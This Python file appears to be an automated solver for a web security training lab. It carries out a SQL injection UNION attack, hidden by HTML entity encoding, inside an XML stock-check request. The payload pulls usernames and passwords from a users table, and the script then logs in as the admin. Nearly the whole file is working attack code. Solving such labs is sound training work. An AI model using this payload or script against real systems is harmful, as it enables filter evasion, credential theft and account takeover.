from ..utils import *


def solve_lab(session):
    path = "/product/stock"

    payload = "4444 UNION SELECT username || ':' || password FROM users"
    print_info(f'HTML-encoding payload "{payload}"...')

    payload = "".join([f"&#{ord(char)};" for char in payload])
    print_success(f'HTML-encoded payload: "{payload}"\n')

    headers = {"Content-Type": "application/xml"}
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'

    print_info(
        f'Performing a UNION attack with the following POST request to "{path}":\n'
    )
    print(f"headers: {headers}")
    print(f"data: {data}\n")

    resp = session.post_path(path, headers=headers, data=data)
    print_success(f"Extracted the following credentials:\n{resp.text}")

    for credentials in resp.text.splitlines():
        username, password = credentials.split(":")
        if username.startswith("admin"):
            print()
            break
    else:
        print_fail("Unable to find admin credentials")

    session.login(username, password)
